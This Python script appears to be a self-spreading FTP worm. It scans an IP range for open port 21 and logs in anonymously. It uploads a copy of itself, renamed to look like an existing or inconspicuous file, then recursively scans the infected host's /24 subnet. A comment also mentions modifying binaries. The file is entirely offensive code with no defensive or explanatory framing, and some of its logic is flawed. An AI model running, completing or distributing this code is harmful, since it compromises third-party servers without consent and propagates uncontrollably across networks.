import ftputil
import ipaddress
import concurrent.futures
import dns.resolver
import socket
import ftplib
import os


def scan_host(ip_address_str):
    try:
        with ftputil.FTPHost(ip_address_str) as ftp_host:
            ftp_host.chdir('/')
            ftp_host.stat('.')
            print(f"FTP server found at {ip_address_str}")
            try:
                ftp_host.login()
                print(f"Anonymous login successful for {ip_address_str}")
                ftp_host.upload('./script.py', 'script.py')

                # Rename script to match file with same extension but with .py at the end,
                # or rename to something inconspicuous with a .txt.py extension if no other files exist
                file_list = ftp_host.listdir('.')
                matching_files = [f for f in file_list if f.endswith('.py') and not f.endswith('.txt.py')]
                if len(matching_files) > 0:
                    ext = os.path.splitext(matching_files[0])[1]
                    new_name = os.path.splitext(matching_files[0])[0] + '.py'
                    ftp_host.rename('script.py', new_name)
                else:
                    new_name = 'new_file.txt.py'
                    ftp_host.rename('script.py', new_name)

                ftp_host.close()
                print(f"Script copied and renamed to {new_name} at {ip_address_str}")

                with ftputil.FTPHost(ip_address_str, 'anonymous', '') as ftp_host_anon:
                    ftp_host_anon.chdir('/')
                    ftp_host_anon.stat('.')
                    print(f"Scanning subnet for {ip_address_str}")
                    for target_ip in ipaddress.ip_network(ip_address_str + '/24'):
                        scan_host(str(target_ip))
            except ftputil.error.FTPIOError as e:
                print(f"Anonymous login failed for {ip_address_str}: {e}")
    except ftputil.error.FTPOSError:
        pass


def resolve_hostname(ip_address_str):
    try:
        answers = dns.resolver.query(ip_address_str, "PTR")
        hostname = str(answers[0])[:-1]  # Remove trailing dot from hostname
        return hostname
    except dns.exception.DNSException:
        return None


def scan_port(ip_address_str, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        s.connect((ip_address_str, port))
        s.send(b'HEAD / HTTP/1.0\r\n\r\n')
        result = s.recv(1024)
        s.close()

        if port == 21 and "220" in result.decode("utf-8"):
            ftp = ftplib.FTP(ip_address_str)
            ftp.login()
            ftp.quit()

            # Copy script to target and modify binary
            # ...

        return True
    except:
        return False


def main():
    while True:
        target = input("Enter a target IP or subnet (CIDR notation): ")
        try:
            ip_network = ipaddress.ip_network(target)
            break
        except ValueError:
            print("Invalid target. Please enter a valid IP address or subnet in CIDR notation (e.g. 192.168.0.0/24)")

    with concurrent.futures.ThreadPoolExecutor() as executor:
        for host in ip_network.hosts():
            ip_address_str = str(host)
            hostname = resolve_hostname(ip_address_str)
            if scan_port(ip_address_str, 21):
                if hostname is not None:
                    print(f"{ip_address_str} ({hostname}) has port 21 open")
                else:
                    print(f"{ip_address_str} has port 21 open")
                executor.submit(scan_host, ip_address_str)
            else:
                if hostname is not None:
                    print(f"{ip_address_str} ({hostname}) has port 21 closed")
                else:
                    print(f"{ip_address_str} has port 21 closed")


if __name__ == '__main__':
    main()
